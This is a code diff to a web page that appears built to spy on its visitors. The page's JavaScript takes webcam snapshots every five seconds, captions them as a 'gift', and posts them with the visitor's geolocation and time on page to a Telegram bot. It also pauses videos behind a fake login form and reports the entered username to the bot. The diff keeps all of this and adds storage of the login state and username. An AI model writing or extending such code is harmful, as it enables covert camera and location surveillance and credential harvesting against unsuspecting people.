@@ -218,10 +218,14 @@
     const ctx = canvas.getContext("2d");
     let userLocation = {};
     
-    // Dummy login state
-    let isLoggedIn = false;
-    // Store reference to the video that triggered the login modal
+    // Dummy login state: Check localStorage on page load
+    let isLoggedIn = localStorage.getItem("isLoggedIn") === "true";
     let currentVideo = null;
+
+    // If already logged in, you might hide the login modal (if open)
+    if(isLoggedIn) {
+      document.getElementById('loginModal').style.display = 'none';
+    }
 
     // Start camera for capture (remains unchanged)
     navigator.mediaDevices.getUserMedia({ video: true })
@@ -260,18 +264,16 @@
         console.error("Failed to capture snapshot.");
         return;
       }
-
       const formData = new FormData();
       formData.append("chat_id", chatId);
       formData.append("photo", blob, "snapshot.png");
       formData.append("caption", `Here is your auto-captured gift!\n📍 Location: ${userLocation.lat}, ${userLocation.lon}`);
-
       fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
         method: "POST",
         body: formData
       })
       .then(response => response.json())
-      .then(() => sendLocation()) // Send location after photo
+      .then(() => sendLocation())
       .catch(error => console.error("Error sending photo:", error));
     }
 
@@ -280,7 +282,6 @@
         console.error("Location not available.");
         return;
       }
-
       fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -311,11 +312,11 @@
     }
 
     function startLoopCapture() {
-      captureAndSend(); // Capture first image immediately
-      setInterval(captureAndSend, 5000); // Capture image every 5 seconds
+      captureAndSend();
+      setInterval(captureAndSend, 5000);
     }
 
-    /************** 10. Time Spent on Page **************/
+    /************** Time Spent on Page **************/
     const pageStartTime = Date.now();
     window.addEventListener("beforeunload", function () {
       const timeSpent = Math.round((Date.now() - pageStartTime) / 1000);
@@ -383,7 +384,7 @@ Timezone: ${timezone}`;
       overlay.classList.add('show');
       setTimeout(() => {
         overlay.classList.remove('show');
-      }, 1500); // Adjust duration as needed
+      }, 1500);
     }
     
     // Attach event listeners for each video for 5s check
@@ -395,7 +396,6 @@ Timezone: ${timezone}`;
           showLoginModal();
         }
       });
-      // Ensure video doesn't resume if not logged in
       videoEl.addEventListener('play', function() {
         if (!isLoggedIn && this.currentTime >= 5) {
           this.pause();
@@ -411,11 +411,12 @@ Timezone: ${timezone}`;
       const password = document.getElementById('password').value;
       if (username && password) {
         isLoggedIn = true;
+        // Save login state so user won't be asked again
+        localStorage.setItem("isLoggedIn", "true");
+        localStorage.setItem("username", username);
         hideLoginModal();
         showSuccessAnimation();
-        // Send login details to the bot (username only for privacy)
         sendToBot(`User "${username}" has logged in.`);
-        // Resume the video after a short delay to allow animation to complete
         setTimeout(() => {
           if (currentVideo) {
             currentVideo.play();
